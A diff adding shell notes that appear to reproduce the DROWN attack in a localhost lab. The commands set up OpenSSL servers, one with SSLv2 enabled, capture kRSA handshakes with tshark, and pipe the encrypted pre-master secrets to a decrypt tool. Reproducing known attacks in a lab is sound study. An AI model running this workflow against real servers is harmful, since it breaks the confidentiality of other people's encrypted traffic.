@@ -1,0 +1,10 @@
+/home/kali/Git/Drown/openssl_install/bin/openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 500
+/home/kali/Git/Drown/openssl_install/bin/openssl s_server -cert cert.pem -key key.pem -accept 6620 -www
+tshark -i lo -w tls_comm.cap tcp port 4433
+for i in $(seq 1000) ; do (echo 'GET / HTTP/2.0\r\n'; sleep 0.1) | /home/kali/Git/Drown/openssl_install/bin/openssl s_client -connect localhost:6620 -cipher kRSA; done
+
+
+/home/kali/Git/Drown/openssl_install/bin/openssl  s_server -cert cert.pem -key key.pem -accept 6120 -www -ssl2 -no_dhe -no_ecdhe
+
+#copy that cap and pem file first
+tshark -r tls_comm.cap -d tcp.port==6120,tls -T fields -e tls.handshake.epms -Y tls.handshake.epms | tr -d : | ./decrypt localhost:6120 cert.pem > pre_master_secret.txt
